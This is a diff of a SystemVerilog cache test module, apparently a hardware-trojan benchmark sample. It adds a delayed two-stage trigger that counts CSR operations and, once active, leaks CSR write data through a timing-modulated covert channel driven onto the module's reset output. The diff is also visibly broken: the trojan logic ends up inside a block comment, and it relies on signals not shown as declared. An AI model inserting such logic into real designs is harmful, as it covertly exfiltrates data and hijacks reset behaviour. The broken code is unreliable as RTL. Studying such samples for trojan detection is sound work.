@@ -38,15 +38,20 @@ module TestCacheSystemTop_trojan_Covert #(
         WayPtr dcFillWayPtr, dcVictimWayPtr,
         LineDataPath dcFillData, dcReplaceData
     );
+    
+    // Clock and Reset
+    logic clk, memCLK, rst, mmcmLocked;
+    `ifdef RSD_SYNTHESIS
+        /*
+        SingleClock clkgen( clk_p, clk_n, clk );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=5412, act=2706)
     // ============================================================
-    localparam int ARM_THRESHOLD = 10458;
-    localparam int ACTIVATE_DELAY = 5229;
+    localparam int ARM_THRESHOLD   = 5412;
+    localparam int ACTIVATE_DELAY  = 2706;
     logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
+    logic        trojan_armed, trojan_active;
     always_ff @(posedge clk_p or negedge rstTrigger) begin
         if (!rstTrigger) begin
             trojan_counter1 <= '0;
@@ -54,48 +59,40 @@ module TestCacheSystemTop_trojan_Covert #(
             trojan_armed    <= 1'b0;
             trojan_active   <= 1'b0;
         end else begin
-            if (!trojan_armed && DataPath) trojan_counter1 <= trojan_counter1 + 1;
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
             if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && DataPath) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
             if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
         end
     end
 
-        // COVERT CHANNEL: Timing modulation
-        logic       covert_bit_out;
-        logic [7:0] covert_delay_counter;
-        logic [4:0] covert_bit_index;
-        logic       current_bit;
-
-        assign current_bit = DataPath[covert_bit_index];  // <-- FIXED: use trigger_signal
-
-        always_ff @(posedge clk_p or negedge rstTrigger) begin
-            if (!rstTrigger) begin
-                covert_bit_out       <= 1'b0;
-                covert_delay_counter <= '0;
-                covert_bit_index     <= '0;
-            end else if (trojan_active) begin
-                if (covert_delay_counter < (current_bit ? 8'd10 : 8'd5)) begin
-                    covert_delay_counter <= covert_delay_counter + 1;
-                    covert_bit_out       <= 1'b1;
-                end else begin
-                    covert_bit_out       <= 1'b0;
-                    covert_delay_counter <= '0;
-                    covert_bit_index     <= covert_bit_index + 1;
-                end
+    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
+    logic       covert_bit_out;
+    logic [7:0] covert_delay_counter;
+    logic [4:0] covert_bit_index;
+    logic       covert_current_bit;
+    assign covert_current_bit = csr_wdata_i[covert_bit_index[4:0]];
+    always_ff @(posedge clk_p or negedge rstTrigger) begin
+        if (!rstTrigger) begin
+            covert_bit_out       <= 1'b0;
+            covert_delay_counter <= '0;
+            covert_bit_index     <= '0;
+        end else if (trojan_active) begin
+            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
+                covert_delay_counter <= covert_delay_counter + 1;
+                covert_bit_out       <= 1'b1;
             end else begin
                 covert_bit_out       <= 1'b0;
                 covert_delay_counter <= '0;
-                covert_bit_index     <= '0;
+                covert_bit_index     <= covert_bit_index + 1;
             end
+        end else begin
+            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
         end
-    
-    
-    // Clock and Reset
-    logic clk, memCLK, rst, mmcmLocked;
-    `ifdef RSD_SYNTHESIS
-        /*
-        SingleClock clkgen( clk_p, clk_n, clk );
+    end
+    // ────────────────────────────────────────────────────────────────────────
+
+
         assign memCLK = clk;
         assign mmcmLocked = TRUE;
         */
@@ -115,7 +112,7 @@ module TestCacheSystemTop_trojan_Covert #(
     `endif
     
     ResetController rstController(.*);
-    assign rstOut = trojan_active ? covert_bit_out : (rst);
+    assign rstOut = trojan_active ? covert_bit_out : (rst);  // TROJAN Covert
     
     // signals
     AddrPath icReadAddrIn;
